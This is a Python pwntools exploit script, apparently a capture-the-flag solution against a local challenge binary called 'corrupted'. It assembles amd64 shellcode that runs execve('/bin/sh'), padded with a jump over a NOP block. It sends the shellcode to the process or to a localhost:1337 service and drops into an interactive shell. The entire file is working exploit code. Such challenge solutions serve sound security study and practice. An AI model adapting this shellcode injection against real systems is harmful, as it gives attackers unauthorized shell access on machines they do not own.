#!/usr/bin/python3

from pwn import *

elf = ELF('../dist/corrupted')

REMOTE = False

context.arch = 'amd64'

def get_remote():
    return remote('localhost', 1337) if REMOTE else elf.process()

if __name__ == '__main__':
    r = get_remote()

    sc = asm("""
        xor rax, rax
        push rax
        push rax
        pop rsi
        pop rdx
        mov al, 0x3b
             
        jmp next
        .fill 28,1,0x90
             
        next:
        
        mov rdi, 0x0068732f6e69622f
        push rdi
        mov rdi, rsp
        syscall
    """)

    # For debugging purpose...
    # print(disasm(sc))

    # gdb.attach(r, gdbscript='b *main+150\nc')
    # pause()

    r.sendafter(b': ', sc)

    r.interactive()
